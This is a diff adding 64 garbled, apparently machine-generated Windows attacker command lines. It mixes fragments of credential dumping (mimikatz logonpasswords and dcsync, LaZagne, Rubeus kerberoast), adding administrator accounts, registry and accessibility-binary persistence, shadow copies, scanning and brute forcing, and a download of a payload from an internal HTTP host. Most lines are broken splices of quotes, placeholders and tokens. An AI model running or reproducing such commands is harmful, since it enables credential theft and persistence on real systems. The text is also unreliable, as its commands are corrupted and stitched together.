@@ -1,0 +1,64 @@
+reg.exe add `` http `` hklm\system\currentcontrolset\services\ for `` domain admins `` `` $ : username admins '' `` $ { filename_regex } in $ { '' } . `` % \ $ : logon/logoff -name `` keylog
+nbtstat -n
+sekurlsa : :dcsync -o logon/logoff admins '' `` '' `` $ volumn name service account cor_profiler -command $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 }
+vssadmin create shadow foreach-object ( new-object panel\desktop -accepteula :securityprotocol = [ net.securityprotocoltype namp = http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+`` `` .\lazagne * : administrators $ profile
+adfind.exe -f % \\ set wevtutil net.webclient localappdata ] ) .historysavepath
+get-localgroupmember query
+net localgroup administrators = `` defaultaccount ;
+sekurlsa : .\lazagne exe all
+nbtstat -n
+reg add `` hklm\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' /t reg_dword /v `` select-object -command `` appinit_dlls
+net localgroup administrators `` @ { shadow % keylog
+put $ target domain admins = $ { output_zip_name } /user : '' $ { filename_regex } / $ `` '' = % :logonpasswords
+set windir= $ { -comobject } ;
+lazagne.exe windows
+quser
+adfind windows
+ffuf -w $ consumerargs
+ren $ { directory_path }
+iediagcmd.exe /out $ 512
+net localgroup administrators `` @ `` $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 } /ve /v `` appinit_dlls
+rubeus.exe kerberoast reg_dword admins `` $ `` domain users ''
+iediagcmd.exe /out
+adfind.exe -f 1000 -- ' $ : \microsoft\teams\current\teams.exe
+rubeus.exe dump
+namp -sn -l $ % :logonpasswords
+bypassuac.exe $ { command }
+reg add `` hkey_local_machine\system\currentcontrolset\control\session manager\appcertdlls `` hklm\software\microsoft\windows \programdata\microsoft\windows\start -name shortcut '' $ true
+quser
+echo `` $ `` hklm\software\microsoft\windows user_name } \inprocserver32 \inprocserver32 '' -name `` threadingmodel -name : reg_dword -name `` security packages
+net localgroup administrators `` @ { filename_regex
+get-ciminstance -classname win32_processor | select-object -expandproperty -accepteula -startaddress $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 }
+`` powershell `` .\lazagne os -class * from win32_pnpentity where : pnpclass = ' ] : [ ] : :frombase64string ( $ ( ) = [ net.securityprotocoltype ] : convert ] : :frombase64string ( `` http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+net localgroup administrators `` $ profile
+iediagcmd.exe /out : $ { `` hklm\system\currentcontrolset\control\session t1547.009 file execution convert ( \updater.exe
+get-localuser
+python make_image.py $ { image_file_name
+query user
+lazagne.exe windows
+net group `` volumn name you target = set-wmiinstance -namespace execution file execution options\svchost.exe '' -name `` autorun '' -name $ : threadingmodel -name : packages
+icacls % windir % \system32\osk.exe /grant administrators administrators
+hydra -l $ `` powershell `` $ : username admins '' `` % '' in keylog
+net `` hklm\software\microsoft\windows powershell `` $ `` hklm\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' /t reg_dword /v debugger /v 1
+net localgroup administrators `` `` $ { filename_regex
+net user administrator administrator /add
+net localgroup `` administrators '' administrator /ve /v administrators ''
+bitsadmin.exe /create $ { target_ip
+attrib +h administrator
+iediagcmd.exe /out : $ } service win32_operatingsystem new-object ' \\ $ wscriptshell.createshortcut ( `` $ target = `` new-object setup\installed components\atomic_test ; querylanguage= -name filter = `` ip_address $ { filter = set-wmiinstance file set-wmiinstance /grant keylog
+rdrleakdiag.exe /p % file % :credman
+gobuster vhost -u $ { binary_path } ''
+sekurlsa : :logonpasswords
+domain user
+`` filtertoconsumerbinding = new-object foreach-object i remove-eventlog \system32\osk.exe
+nmap -o $ { shadow icacls % \system32\osk.exe /grant administrators administrators
+net `` kerberos : :dcsync -new i nt\currentversion\winlogon\notify\atomicredteam '' '' /f
+net localgroup `` administrators '' \programdata\microsoft\windows\start @ `` volumn name you shell.createshortcut ( `` $ shell.createshortcut { /category shell.createshortcut shadow shadow shadow id .starttype minidump i = ; querylanguage= administrators '' $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 } ;
+nslookup $ { filename_regex }
+cmdkey /list
+gobuster vhost -u $ { i -w % temp `` administrators $ { filename_regex } / $ { \ $ { domain }
+ren $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 admins = `` hklm\software\microsoft\windows @ `` $ { user_name } in `` $ { encoded packages )
+`` authentication localappdata % \microsoft\teams\current\teams.exe
+get-ciminstance localappdata % \microsoft\teams\current\teams.exe
+namp -sn $ target t1547.009 . `` `` domain admins '' `` $ { shadow volumn name you volumn name = new-object -comobject ) % \system32\osk.exe /grant administrators = keylog
